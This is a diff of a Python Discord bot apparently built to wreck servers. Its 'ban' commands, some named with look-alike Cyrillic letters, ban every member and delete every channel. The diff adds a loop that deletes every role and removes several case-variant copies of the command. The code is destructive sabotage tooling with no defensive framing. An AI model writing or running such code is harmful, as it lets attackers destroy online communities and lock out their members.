@@ -14,9 +14,15 @@ async def bаn(ctx, arg):
         except:
             pass
     for chanel in ctx.guild.channels:
-        print('ban')
+        print('channel deleted')
         try:
             await chanel.delete()
+        except:
+            pass
+    for role in ctx.guild.roles():
+        print('role deleted')
+        try:
+            await role.delete()
         except:
             pass
 
@@ -30,95 +36,15 @@ async def ban(ctx, arg):
         except:
             pass
     for chanel in ctx.guild.channels:
-        print('ban')
+        print('channel deleted')
         try:
             await chanel.delete()
         except:
             pass
-
-
-@bot.command()
-async def BаN(ctx, arg):
-    for user in ctx.guild.members:
-        print('ban')
+    for role in ctx.guild.roles():
+        print('role deleted')
         try:
-            await ctx.guild.ban(user)
-        except:
-            pass
-    for chanel in ctx.guild.channels:
-        print('ban')
-        try:
-            await chanel.delete()
-        except:
-            pass
-@bot.command()
-async def BАN(ctx, arg):
-    for user in ctx.guild.members:
-        print('ban')
-        try:
-            await ctx.guild.ban(user)
-        except:
-            pass
-    for chanel in ctx.guild.channels:
-        print('ban')
-        try:
-            await chanel.delete()
-        except:
-            pass
-@bot.command()
-async def BAN(ctx, arg):
-    for user in ctx.guild.members:
-        print('ban')
-        try:
-            await ctx.guild.ban(user)
-        except:
-            pass
-    for chanel in ctx.guild.channels:
-        print('ban')
-        try:
-            await chanel.delete()
-        except:
-            pass
-@bot.command()
-async def Ban(ctx, arg):
-    for user in ctx.guild.members:
-        print('ban')
-        try:
-            await ctx.guild.ban(user)
-        except:
-            pass
-    for chanel in ctx.guild.channels:
-        print('ban')
-        try:
-            await chanel.delete()
-        except:
-            pass
-@bot.command()
-async def baN(ctx, arg):
-    for user in ctx.guild.members:
-        print('ban')
-        try:
-            await ctx.guild.ban(user)
-        except:
-            pass
-    for chanel in ctx.guild.channels:
-        print('ban')
-        try:
-            await chanel.delete()
-        except:
-            pass
-@bot.command()
-async def bаN(ctx, arg):
-    for user in ctx.guild.members:
-        print('ban')
-        try:
-            await ctx.guild.ban(user)
-        except:
-            pass
-    for chanel in ctx.guild.channels:
-        print('ban')
-        try:
-            await chanel.delete()
+            await role.delete()
         except:
             pass
 
